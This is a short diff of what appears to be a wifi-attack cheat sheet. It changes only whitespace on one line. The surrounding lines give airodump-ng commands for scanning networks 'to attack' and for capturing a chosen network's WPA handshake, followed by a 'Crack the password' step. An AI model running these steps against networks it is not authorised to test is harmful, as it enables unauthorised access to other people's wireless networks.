@@ -5,7 +5,7 @@
 # See the new adaptor:
  iwconfig
 # Search for all wifi available for you to attack and mark the channel and mac address of the wifi you want to attack:
-airodump-ng wlan1mon 
+ airodump-ng wlan1mon 
 # Capture wpa handshake: (EAPOL)
  airodump-ng -c <channel-no> -w <name-of-output-file> -d <mac-address> wlan1mon : 
 # Crack the password:
